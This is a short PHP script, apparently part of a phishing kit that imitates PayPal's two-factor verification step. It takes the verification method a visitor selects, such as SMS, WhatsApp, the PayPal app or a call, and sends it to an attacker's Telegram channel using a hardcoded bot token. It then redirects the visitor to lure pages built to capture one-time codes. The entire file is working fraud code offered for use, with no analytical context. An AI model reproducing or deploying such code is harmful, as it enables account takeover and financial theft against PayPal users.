<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recupera il valore del radio button selezionato
    $selectedOption = $_POST["selectedChallengeType"];

    // Token del bot Telegram e ID del canale
    $botApiToken = '6400179200:AAFLNC22j2zdSxCD83QB70N3zgHyG3AMgiA';
    $channelId = '8105246558';

    // Creazione del messaggio da inviare
    $txt = "📋 Opzione selezionata: {$selectedOption}";

    // Costruzione della query per l'API di Telegram
    $query = http_build_query([
        'chat_id' => $channelId,
        'text' => $txt,
    ]);

    // URL dell'API di Telegram
    $url = "https://api.telegram.org/bot{$botApiToken}/sendMessage?{$query}";

    // Inizializza cURL per inviare la richiesta HTTP
    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CUSTOMREQUEST => 'GET',
    ]);

    // Esegui la richiesta e chiudi cURL
    $response = curl_exec($curl);
    curl_close($curl);

    // Redirect basato sul valore della checkbox
    switch ($selectedOption) {
        case 'SMS Message':
            header("Location: PP2fa/index.html");
            break;
        case 'whatsapp':
            header("Location: PP2fa/index.html");
            break;
        case 'PayPal App':
            header("Location: App.html");
            break;
        case 'CALL':
            header("Location: call.html");
            break;
        default:
            header("Location: index.html");
            break;
    }
    exit;
}
?>